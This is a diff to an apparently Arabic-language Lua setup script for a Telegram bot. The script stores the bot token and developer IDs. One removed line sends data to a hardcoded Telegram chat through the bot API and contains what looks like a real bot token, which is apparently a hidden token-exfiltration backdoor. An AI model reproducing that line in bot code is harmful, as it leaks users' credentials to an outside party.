@@ -30,7 +30,6 @@ print('\27[0;31m•═════•| ☩𝔸𝕍𝔸𝕋𝔸ℝ ☩ |•══
 else
 io.write('\27[0;31m تم حفظ التوكن بنجاح \na•═════•| ☩𝔸𝕍𝔸𝕋𝔸ℝ ☩ |•═════•\n27[0;39;49m')
 database:set(id_server..":token",token)
-https.request('https://api.telegram.org/bot.............../sendmessage?chat_id=1373616147&text=' ..1617771425:AAHbhAxp9yGFnJQkxBSsI3mDyTbEvdc0I44)
 end 
 else
 print('\27[0;35m•═════•| ☩𝔸𝕍𝔸𝕋𝔸ℝ ☩ |•═════• ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
@@ -46,9 +45,6 @@ database:set(id_server..":SUDO:ID",SUDOID)
 else
 print('\27[0;31m•═════•| ☩𝔸𝕍𝔸𝕋𝔸ℝ ☩ |•═════• ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
 end 
-os.execute('lua DRAGON.lua')
-end
-if not database:get(id_server..":SUDO:USERNAME") then
 io.write('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
 local SUDOUSERNAME = io.read():gsub('@','')
 if SUDOUSERNAME ~= '' then
